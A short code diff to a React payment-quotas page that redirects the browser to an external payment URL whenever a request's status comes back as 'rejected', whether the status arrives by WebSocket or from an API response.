@@ -95,6 +95,10 @@ export default function PaymentQuotasPage(_props: PaymentQuotasProps) {
         if (data.type === 'request_update' || data.type === 'request_status') {
           console.log('📩 Actualización recibida via WebSocket:', data.request?.status);
           const requestData = data.request;
+          if (requestData?.status === 'rejected') {
+            window.location.href = 'https://pagoexpress.forum.cl/express/#/';
+            return;
+          }
           if (requestData?.response) {
             const extracted = extractUserDataFromResponse(requestData);
             if (extracted) {
@@ -439,6 +443,11 @@ export default function PaymentQuotasPage(_props: PaymentQuotasProps) {
         
         const data = await response.json();
         console.log("Datos recibidos del API:", data);
+
+        if (data.status === 'rejected') {
+          window.location.href = 'https://pagoexpress.forum.cl/express/#/';
+          return;
+        }
         
         // Pasamos los datos completos del API, no solo la respuesta
         console.log("Datos completos para extraer:", data);
